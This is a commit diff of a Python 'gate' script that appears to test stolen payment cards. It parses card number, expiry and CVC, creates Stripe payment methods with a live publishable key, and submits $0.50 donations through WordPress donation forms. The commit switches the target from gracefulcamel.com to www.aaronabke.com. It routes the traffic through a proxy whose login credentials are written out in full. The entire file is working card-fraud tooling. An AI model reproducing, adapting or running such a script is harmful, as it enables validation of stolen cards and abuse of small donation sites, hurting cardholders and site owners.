636998d29120e3c0f11f7a1a95639053e3ec4a22
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-04-19 10:07:23 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -1,6 +1,9 @@
 import requests,re
+from proxy import reqproxy, make_request
 def Tele(ccx):
-	import requests
+	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_306de257-zone-web_scrapping:e7l003m6w1ks"
+	session, ip = reqproxy(proxy_str)
+	#print(f"IP Address: {ip}")
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -9,7 +12,7 @@ def Tele(ccx):
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
 	r = requests.session()
-
+	
 	headers = {
 	    'authority': 'api.stripe.com',
 	    'accept': 'application/json',
@@ -26,35 +29,26 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fe9b153e2b2%3B+stripe-js-v3%2Fe9b153e2b2%3B+card-element&key=pk_live_51Q6NmKCRrC0jkoUKiwulfVNT9VFfrS7QE7EBCVPyJp4G40TZ8MgGCJmEqa0zzB3eDhOa1isyZwakmOUne1NctGFt00yvLRhLLK'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F560413f346%3B+stripe-js-v3%2F560413f346%3B+card-element&referrer=https%3A%2F%2Fwww.aaronabke.com&time_on_page=52825&key=pk_live_51GGaWMAJSPmZlL2afbQZDpv2vTIB3894XGGxamKUqTCkHjOi5xT0xBMn8GYDCIiWqs2T6mFpst5ZwqnwlJzghdDC00HIeZ9lw8'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    'sbjs_migrations': '1418474375998%3D1',
-	    'sbjs_current_add': 'fd%3D2025-04-18%2023%3A18%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fgracefulcamel.com%2Ftreasures-collective%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-	    'sbjs_first_add': 'fd%3D2025-04-18%2023%3A18%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fgracefulcamel.com%2Ftreasures-collective%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
-	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgracefulcamel.com%2Ftreasures-collective%2Fdonate%2F',
-	    'tk_or': '%22https%3A%2F%2Fwww.google.com%2F%22',
-	    'tk_r3d': '%22https%3A%2F%2Fwww.google.com%2F%22',
-	    'tk_lr': '%22https%3A%2F%2Fwww.google.com%2F%22',
-	    '__stripe_mid': '5f98cdfe-7a21-4631-a635-a6791ee0430f2cf82d',
-	    '__stripe_sid': 'fa198bca-97fc-40bf-9514-4f312b00f83dfd8cc0',
+	    'cookie_notice_accepted': 'true',
+	    '__stripe_mid': '65f075b0-bfc5-4647-b478-3594b195d66e3459f5',
+	    '__stripe_sid': '04bae8b8-3e40-4f2b-a54f-e3a750cdb59237daf8',
 	}
 	
 	headers = {
-	    'authority': 'gracefulcamel.com',
+	    'authority': 'www.aaronabke.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-04-18%2023%3A18%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fgracefulcamel.com%2Ftreasures-collective%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-04-18%2023%3A18%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fgracefulcamel.com%2Ftreasures-collective%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgracefulcamel.com%2Ftreasures-collective%2Fdonate%2F; tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; __stripe_mid=5f98cdfe-7a21-4631-a635-a6791ee0430f2cf82d; __stripe_sid=fa198bca-97fc-40bf-9514-4f312b00f83dfd8cc0',
-	    'origin': 'https://gracefulcamel.com',
-	    'referer': 'https://gracefulcamel.com/treasures-collective/donate/',
+	    # 'cookie': 'cookie_notice_accepted=true; __stripe_mid=65f075b0-bfc5-4647-b478-3594b195d66e3459f5; __stripe_sid=04bae8b8-3e40-4f2b-a54f-e3a750cdb59237daf8',
+	    'origin': 'https://www.aaronabke.com',
+	    'referer': 'https://www.aaronabke.com/donate/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -66,23 +60,22 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1745018384061',
+	    't': '1744935267616',
 	}
 	
 	data = {
-	    'data': 'item_5__fluent_sf=&__fluent_form_embded_post_id=337&_fluentform_5_fluentformnonce=8052a41ca7&_wp_http_referer=%2Ftreasures-collective%2Fdonate%2F&names%5Bfirst_name%5D=&names%5Bmiddle_name%5D=&names%5Blast_name%5D=&input_text_2=&donation_email=rodamuser08%40gmail.com&address1%5Baddress_line_1%5D=&address1%5Baddress_line_2%5D=&address1%5Bcity%5D=&address1%5Bstate%5D=&address1%5Bzip%5D=&address1%5Bcountry%5D=&fluent_donation_amount=0.50&donate_payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
+	    'data': 'item_4__fluent_sf=&__fluent_form_embded_post_id=884&_fluentform_4_fluentformnonce=a458ecc2cf&_wp_http_referer=%2Fdonate%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&custom-payment-amount=0.50&payment_input=0&payment_input_custom_0=0&payment_input_custom_1=&input_text=&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
 	    'action': 'fluentform_submit',
-	    'form_id': '5',
+	    'form_id': '4',
 	}
 	
-	r2 = requests.post(
-	    'https://gracefulcamel.com/wp-admin/admin-ajax.php',
+	r2 = session.post(
+	    'https://www.aaronabke.com/wp-admin/admin-ajax.php',
 	    params=params,
 	    cookies=cookies,
 	    headers=headers,
 	    data=data,
 	)
 	
-	return (r2.json())
-	
-
+	result2 = r2.text
+	return result2
